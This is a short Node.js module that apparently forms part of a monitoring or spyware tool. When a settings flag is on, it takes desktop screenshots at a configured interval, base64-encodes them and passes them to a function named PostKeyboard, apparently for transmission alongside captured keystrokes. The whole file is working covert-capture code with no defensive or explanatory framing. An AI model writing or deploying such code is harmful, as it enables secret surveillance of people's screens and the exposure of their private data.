module.exports = function() {
const screenshot = require('../../../../node_modules/screenshot-desktop');
let shared=require("../../shared/Shared.js");
let response= shared.readSetting();

setInterval(function(){
    response= shared.readSetting();
    if(response.ScreenShotEnable==true)
    {
    screenshot({format: 'png'}).then((img) => {
   
        var string = img.toString('base64');
        let object={'Type':"ScreenShot",'Out':string};
        shared.PostKeyboard(object);
    }).catch((err) => {
    console.log(err);
    })   
    }
},response.ScreenShot)
}